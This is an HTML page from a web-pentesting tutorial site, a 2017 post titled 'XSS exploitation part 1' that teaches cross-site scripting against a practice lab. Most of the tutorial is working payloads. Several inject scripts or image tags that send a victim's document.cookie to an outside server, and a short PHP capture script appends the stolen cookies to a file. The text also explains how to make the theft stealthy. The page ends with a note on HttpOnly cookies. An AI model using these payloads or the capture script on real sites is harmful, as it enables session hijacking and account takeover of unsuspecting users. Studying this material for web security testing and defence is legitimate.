 <!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
<meta name="keywords" content="Security Idiots, Hacking Research Papers, Security Research Papers, Web application Penetration Testing, Web Pentesting, web Injection, SQL Injection, XSS, RFI, LFI, LDAP, XPATH, Bypass, RCE, XML Injection" />
<meta name="description" content="Finally, we are finished with basics of javascript for XSS and here we are with the first part of XSS exploitation.">
<title>XSS exploitation part 1</title>
<link rel="stylesheet" href="../../css/skel.css" />
<link rel="stylesheet" href="../../css/style.css" />
<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
<script src="../../js/jquery.min.js"></script>
<script src="../../js/jquery.dropotron.min.js"></script>
<script src="../../js/skel.min.js"></script>
<script src="../../js/skel-layers.min.js"></script>
<script src="../../js/init.js"></script>
<script src="../../js/jquery.treeview.js" type="text/javascript"></script>
<script src="../../js/jquery.cookie.js" type="text/javascript"></script>
<script src="../../js/demo.js" type="text/javascript"></script>
<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
<div id="fb-root"></div>
<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=727224234003200&version=v2.0";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));

</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-54093058-1', 'auto');
  ga('send', 'pageview');

</script>
<script id="dsq-count-scr" src="https://securityidiots-com.disqus.com/count.js" async></script>
</head>
<body class="left-sidebar"> 
<div id="header">
<div class="container">

<h1><a href="xss-exploitation-series-part-1.html#" id="logo">Security Idiots</a></h1>

<nav id="nav">
<ul>
<li><a href="../../index.html">Home</a></li>
<li>
<a href="xss-exploitation-series-part-1.html">Categories</a>
<ul>
<li><a href="../Information-Gathering/index.html">Information Gathering</a>
<ul>
<li><a href="../Information-Gathering/Cloudflare-Bypass/index.html">Cloudflare Bypass</a></li>
</ul>
</li>
<li><a href="../SQL-Injection/index.html">SQL Injection</a>
<ul>
<li><a href="../SQL-Injection/MSSQL/index.html">MSSQL</a></li>
</ul>
</li>
<li><a href="../Tricks/index.html">Tricks</a></li>
<li><a href="index.html">XSS</a></li>
<li><a href="../LFI/index.html">LFI</a></li>
<li><a href="../XPATH-Injection/index.html">XPATH Injection</a></li>
</ul>
</li>
<li><a href="https://www.youtube.com/watch?v=nMOyvIWn5Y8&list=PL5e1zp5ChO-S4nlMUy60AMIkB0XDgd8wb" target="_BLANK">Video Gallery</a></li>
<li><a href="../../construction.html">The Idiots Team</a></li>
<li><a href="../../construction.html">Contact Us</a></li>
</ul>
</nav>
</div>
</div>

<div id="main" class="wrapper style1">
<div class="container">
<div class="row"> 
<div id="sidebar" class="4u sidebar" style="width:25%;background:white;padding:20px;color:black; border: 2px solid #a1a1a1;border-radius: 25px;">
<section>
<header class="major">
<h2>Tutorials Browser</h2>
</header>
<div class="row half">
<ul id="browser" class="filetree">
<li><a href="../../Web-Pentest.html"><span class="folder">Web Pentest</span></a><ul id="Web-Pentest"></ul></li>
</ul>
<script>
function SetOpt(type,element,path,title,name){
container = document.getElementById(element);
if(type=='folder')
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span><ul id="'+path+'"></ul></li>';
else
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span></li>';
container.innerHTML = container.innerHTML + element;
}
SetOpt('folder','Web-Pentest','Web-Pentest/Information-Gathering','Information-Gathering','Information-Gathering');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html');
SetOpt('folder','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Cloudflare-Bypass','Cloudflare-Bypass');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html');
SetOpt('folder','Web-Pentest','Web-Pentest/LFI','LFI','LFI');
SetOpt('file','Web-Pentest/LFI','Web-Pentest/LFI/guide-to-lfi.html','guide-to-lfi.html','guide-to-lfi.html');
SetOpt('folder','Web-Pentest','Web-Pentest/SQL-Injection','SQL-Injection','SQL-Injection');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/sql-evil-twin-injection.html','sql-evil-twin-injection.html','sql-evil-twin-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Blind-SQL-Injection.html','Blind-SQL-Injection.html','Blind-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/delete-query-injection.html','delete-query-injection.html','delete-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/update-query-injection.html','update-query-injection.html','update-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/time-based-blind-injection.html','time-based-blind-injection.html','time-based-blind-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/insert-query-injection.html','insert-query-injection.html','insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html','database-type-testing-sql-injection.html','database-type-testing-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/routed_sql_injection.html','routed_sql_injection.html','routed_sql_injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/multi-query-injection.html','multi-query-injection.html','multi-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-insert-query-injection.html','mssql-insert-query-injection.html','mssql-insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html');
SetOpt('folder','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/MSSQL','MSSQL','MSSQL');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html','mssql-dios.html','mssql-dios.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html');
SetOpt('folder','Web-Pentest','Web-Pentest/Tricks','Tricks','Tricks');
SetOpt('file','Web-Pentest/Tricks','Web-Pentest/Tricks/Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html');
SetOpt('folder','Web-Pentest','Web-Pentest/WAF-Bypass','WAF-Bypass','WAF-Bypass');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XPATH-Injection','XPATH-Injection','XPATH-Injection');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-XPATH-injection.html','Basics-XPATH-injection.html','Basics-XPATH-injection.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/xpath-injection-part-1.html','xpath-injection-part-1.html','xpath-injection-part-1.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XSS','XSS','XSS');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss.series-by-securityidiots.html','xss.series-by-securityidiots.html','xss.series-by-securityidiots.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XXE','XXE','XXE');
SetOpt('file','Web-Pentest/XXE','Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html');

</script> </div>
</section>
</div>  <div id="content" class="8u skel-cell-important">
<section class="lol" style="padding:10px;background:#C9C9C2;color:black; border: 2px solid #a1a1a1;border-radius: 8px;">
<header class="major">
<h3><span class="byline">XSS exploitation part 1</span></h3>
<div class="row no-collapse-1">
<span class="post-description" style="text-align:justify;">Hey, Guys! so We are finally finished with the basics of JavaScript :D required to find and Exploit XSS. This tutorial will not be on Finding XSS (We will also talk about that &amp; its different contexts etc..in the next one)<br>
&nbsp;<br>
<em><strong><span style="text-decoration: underline;"><h3>What is Cross-site scripting (XSS)?</h3></span></strong></em>XSS is an attack vector that an attacker could use to inject JavaScript into a Website and exploit it by stealing user's sessions, perform CSRF actions on behalf of victim basically bypassing SOP (Same Origin Policy) about which we talked in JavaScript Final tutorial.<br><br>
Now, There are 3 Types of XSS<br><br>
<span style="text-decoration: underline;"><strong>1. Reflected or Non-Persistent XSS:</strong></span><br>
In This type of XSS, the attacker needs to share a link with Victim and that Will cause Malicious JavaScript to execute. However, XSS will execute on Visting that Specific link with specific XSS Payload only ie. It is not stored and is non-persistent as the name says. The XSS Vector Could be in GET or POST request.<br>
&nbsp;<br>
<span style="text-decoration: underline;"><strong>2. Stored or Persistent XSS:</strong></span><br>
It Occurs in Places Where a Malicious User input Containing XSS Vector is stored or "saved". Thus It may (happens mostly..) cause Multiple User to be affected. Stored XSS could be in User's Name/Comments Section/Group Name/Status/TimeLine/Some Uploaded File Name ie. Some Functionalities/Inputs which could be shared with other Users too, causing multiple users to be affected.<br>
&nbsp;<br>
<span style="text-decoration: underline;"><strong>3. DOM XSS:</strong></span><br>
This a Category of XSS Which could again be both "Stored" or "Reflected".This happens when XSS could be Executed (Sink) in Existing "JavaScript" on the Page itself via an Untrusted User Input(Source). We Will Discuss DOM XSS in details in a Separate Tutorial.<br>
&nbsp;<br>
<span style="text-decoration: underline;"><strong>NOTE</strong>: There's another Category of XSS Called as "Self-XSS" Which is a situation in Which you have Found an XSS Vulnerability (of any type of above listed Three) but it Could not be Shared With any User Except for their Own selves ie. it could not be used to Exploit any User. However, Under some circumstances, it is even possible to convert Self-XSS to an Exploitable One Which is also left for another Upcoming Tutorial.</span><br>
&nbsp;<br>
So again, in this Tutorial We would be talking about "Very Basics of XSS", details regarding Finding XSS's and Different Contexts of XSS would be covered in depth in the next tutorial. First of all in any User Input Try Putting a Simple HTML Tag like &lt;B&gt;, &lt;S&gt;,&nbsp;&lt;I&gt;, &lt;h1&gt;.. etc to Confirm if you are able to inject HTML.<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;h1&gt;SomeRandomText&lt;/h1&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;h1&gt;SomeRandomText&lt;/h1&gt;</a></pre>
Now Check Your Source Code and look for The Entered Input if it's Reflected or not, also you should be able to see the Effect of it in The Page Itself without seeing the source if it's reflected. If The Source Code Contains that, we could Try Using "script" tags as We learned to Execute JavaScript and call the Infamous :P "alert", "confirm" or "prompt" method to confirm that javascript is execution.<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;alert(&quot;Checking&quot;)&lt;/script&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;alert("Checking")&lt;/script&gt;</a></pre>
Now If The Input is Reflected as is into the Page You will see an alert box with "Checking" as its message body, also you could verify by checking the source of the page. Now, &lt;script&gt; Tags are not the only way to Execute javascript, as we learnt we could execute inline-javascript too using Event Handlers (a lot of 'em).<br><br>
Some Examples could be(You could use any suitable Event Handler other than these):<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;body onload=&quot;alert(1)&quot;&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;body onload="alert(1)"&gt;</a></pre>This will execute javascript when body tag gets loaded into The DOM.<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;h1 onmouseover=&quot;alert(1)&quot;&gt;Hover">http://leettime.net/xsslab1/chalg1.php?name=&lt;h1 onmouseover="alert(1)"&gt;Hover</a></pre>This will execute Javascript when we hover mouse on the Heading Tag with Text "Hover"<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;input onfocus=&quot;alert(1)&quot; autofocus&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;input onfocus="alert(1)" autofocus&gt;</a></pre>This will cause input Tag to execute alert when it is focused/selected and "autofocus" attribute focuses it automatically causing to Execute alert(1) without any user interaction and as such there could be such numerous examples.<br><br>
<span style="text-decoration: underline;"><strong><h3>Stealing User's Cookies</h3></strong></span>
JavaScript could be used to Access a User's Cookies as well using "document.cookie" property which we had discussed so one could steal a Victim's Session. Let us use the Classic &lt;script&gt; tags only for now.<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;alert(document['cookie'])&lt;/script&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</a></pre>
But When Shared with Victim, this will alert the cookies but on the Victim Side only. Let us Send These Cookies To Our Server/Website(https://securityidiots.com) by changing "location.href" property.<br><br>
<u><b>NOTE</b>: Remember To URL Encode "+" to %2b in a GET Request otherwise it is treated a WhiteSpace</u><br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;location.href=&quot;https://securityidiots.com/?mycookies=&quot;%2bdocument['cookie']&lt;/script&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;location.href="https://securityidiots.com/?mycookies="+document['cookie']&lt;/script&gt;</a></pre>
This will make Victim to Redirect to "https://securityidiots.com/?mycookies=.....Cookies here .....; UserSession=OIjieowjoiO130901933;" Thus sending Cookies as a parameter to Our Server and We Could Check them in Our Server Logs and Use them in Cookie Header To Access that User's Session on the Affected Website Without Authentication.<br><br>
We Could also make a Simple PHP Script to Capture The Cookies and Save it in a File instead of Checking our Server Logs in case we don't have access.<br><br>
Code: capture.php<pre>&lt;?php<br />if(isset($_GET['mycookies']))<br />file_put_contents("Cookies.txt",$_GET['mycookies'],FILE_APPEND);<br />?&gt;</pre>
Now Making a Request to this Script with cookies in mycookies parameter will Create a file "Cookies.txt" and Keep Saving and Appending all The Cookies To it.<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;location.href=&quot;https://securityidiots.com/capture.php?mycookies=&quot;%2bdocument['cookie']&lt;/script&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;location.href="https://securityidiots.com/capture.php?mycookies="%2bdocument.cookie&lt;/script&gt;</a></pre>
However Since This redirects The Victim to Attacker's Page its noisy and We want our vector to be as stealthy as possible. We Could Use a Tag like Image Tag to send Cookies without redirection or any Major Changes on The Page so We can use document.createElement to Create an image tag and in "src" attribute of it we concatenate our Server with document.cookie and Add it to The DOM.<br><br>
We can do it in following manner:<pre>&lt;script&gt;
var imgtag = document.createElement("img");//creates img element
imgtag.src="http://securityidiots.com/capture.php?mycookies="+document.cookie;//adds attribute src to img element
document.body.appendChild(imgtag);//appends the created element to the body tag of the DOM
&lt;/script&gt;</pre>
so it becomes<br /><pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;var x=document.createElement(&quot;img&quot;);x.src=&quot;http://securityidiots.com/capture.php?mycookies=&quot;%2bdocument['cookie'];document.body.appendChild(x);&lt;/script&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;var x=document.createElement("img");x.src="http://securityidiots.com/capture.php?mycookies="+document['cookie'];document.body.appendChild(x);&lt;/script&gt;</a></pre>
There's an even shorter way to do this, Javascript Provides an "Image" Constructor and Instead of document.createElement('img') you could use: var x=new Image();<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;var x=new Image();x.src=&quot;http://securityidiots.com/capture.php?mycookies=&quot;%2bdocument['cookie'];document.body.appendChild(x);&lt;/script&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;var x=new Image();x.src="http://securityidiots.com/capture.php?mycookies="+document['cookie'];document.body.appendChild(x);&lt;/script&gt;</a></pre>
Now a GET Request would be sent to our server with Cookies of the Victim Stealthily.<br>
You can also use document.write() to directly add write something to the page.<br>
<pre><a href="http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;document.write('&lt;img src=&quot;http://securityidiots.com/capture.php?mycookies='%2bdocument['cookie']%2b'&quot;&gt;')&lt;/script&gt;">http://leettime.net/xsslab1/chalg1.php?name=&lt;script&gt;document.write('&lt;img src="http://securityidiots.com/capture.php?mycookies='+document['cookie']+'"&gt;')&lt;/script&gt;</a></pre>
<b><u>HTTPOnly Cookies!</u></b><br>
A Cookie has the following format:<br><br><b>Cookie: CookieName=CookieValue; Expires=Thu, 01 Jan 1970 00:00:01 GMT; Path=/; Domain=example.com;Secure; HttpOnly</b><br><br>
Cookies are separated by ';' <br />
<table><tr><td><strong>"Expires"</strong>:</td><td> decides the time of cookie to expire, if you Enter a Time of Past it gets expired immediately</td></tr>
<tr><td><strong>"Path"</strong>:</td><td>decides Cookies should be available from Which Path of the Site</td></tr>
<tr><td><strong>"Domain"</strong>:</td><td> Tells Which domain to send cookies to. If it is not specified its limited to the current domain otherwise if specified it applies to its subdomains too</td></tr>
<tr><td><strong>"Secure"</strong>:</td><td> Specifies that Cookies should be sent only over HTTPS connection</td></tr>
<tr><td><strong>"HttpOnly"</strong>:</td><td> if Specified, means that Javascript would not be able to access Cookies. So, in this Case, We Could not Steal any User/Admin Cookies as document.cookie would return an empty string and Thus We can only perform CSRF actions on his behalf Which We Would also Cover in one of the upcoming Tutorials.</td></tr></table>
&nbsp;<br>
So, That's it for this Tutorial, I wanted people to Know How To Exploit a Very Basic XSS by Stealing User Cookies and In The Next Tutorial We would look at in-depth Finding XSS and Different Contexts of XSS. Stay Tuned!<br><br><img src="../../post_images/xss_exploitation.jpg" width=0>
<br>Author : Rahul Maini<br>Date : 2017-05-27</span><br><br></div><div id="disqus_thread"></div>
<script>
var disqus_config = function () {
this.page.url = "http://securityidiots.com/Web-Pentest/XSS/xss-exploitation-series-part-1.html";  
this.page.identifier = "62";
};

(function() {
var d = document, s = d.createElement('script');
s.src = 'https://securityidiots-com.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> </div>
</header>
</section>
</div>
</div>
</div>
</div>

<div id="footer">
<div class="container">

<div class="row">
<div class="8u">
<section>
<header class="major">
<h2>Connect with Security Idiots</h2>
<span class="byline">Learn & share more on Hacking and Security</span>
</header>
<div class="row">
<section class="6u">
<ul class="default">
<li><a href="https://www.facebook.com/pages/securityidiotscom/879838302049912" target="_BLANK"><img src="xss-exploitation-series-part-1.html" width=40>&nbsp;&nbsp;<font size=5><b>FACEBOOK</b></font></a></li>
<li><a href="https://www.youtube.com/channel/UCPPAYs04kwfXcHnerm_ueFw" target="_BLANK"><img src="../../images/youtube.png" width=40>&nbsp;&nbsp;<font size=5><b>Youtube Channel</b></font></a></li>
</ul>
</section>
</div>
</section>
</div>
<div class="4u">
<section>
<header class="major">
<h2>Contact Security Idiots</h2>
</header>
<ul class="contact">
<li>
<span class="address">Email</span>
<span><a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="a3c2c7cecacde3d0c6c0d6d1cad7dacac7caccd7d08dc0ccce">[email&#160;protected]</a></span>
</li>
</ul>
</section>
</div>
</div>

<div class="copyright">
Designed by k-hz webdevelopers
</div>
</div>
</div>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>